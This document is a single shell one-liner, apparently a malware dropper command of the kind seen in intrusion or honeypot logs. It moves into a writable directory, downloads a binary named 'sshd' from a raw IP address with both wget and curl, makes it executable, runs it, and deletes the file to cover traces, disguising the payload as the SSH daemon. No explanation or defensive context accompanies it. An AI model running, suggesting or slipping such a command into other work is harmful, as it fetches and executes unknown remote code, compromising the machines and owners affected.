cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.39.116.106/sshd; curl -O http://5.39.116.106/sshd; chmod +x sshd; ./sshd; rm -rf sshd
